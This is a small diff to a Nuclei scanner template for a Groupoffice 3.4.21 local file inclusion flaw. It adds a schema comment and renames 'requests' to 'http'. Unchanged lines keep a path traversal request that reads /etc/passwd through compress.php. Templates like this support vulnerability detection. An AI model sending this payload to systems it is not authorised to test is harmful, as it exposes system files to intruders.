@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: groupoffice-lfi
 info:
   name: Groupoffice 3.4.21 - Local File Inclusion
@@ -12,7 +13,7 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: groupoffice,lfi,traversal
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/compress.php?file=../../../../../../../etc/passwd"
